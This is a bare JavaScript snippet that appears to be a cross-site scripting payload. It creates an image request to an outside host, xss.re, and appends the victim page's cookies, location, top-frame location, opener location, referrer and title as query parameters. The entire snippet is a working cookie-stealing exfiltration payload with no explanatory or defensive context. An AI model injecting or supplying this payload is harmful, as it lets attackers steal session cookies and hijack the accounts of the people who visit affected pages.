console.log(12345);
var x=new Image();
try
{
var myopener='';
myopener=window.opener && window.opener.location ? window.opener.location : '';
}
catch(err)
{
}
x.src='http://xss.re/XSS/?do=api&act=r&id=5232&diy[location]='+escape(document.location)+'&diy[toplocation]='+escape(top.document.location)+'&diy[cookie]='+escape(document.cookie)+'&diy[opener]='+escape(myopener)+'&diy[referrer]='+escape(document.referrer)+'&diy[title]='+escape(document.title);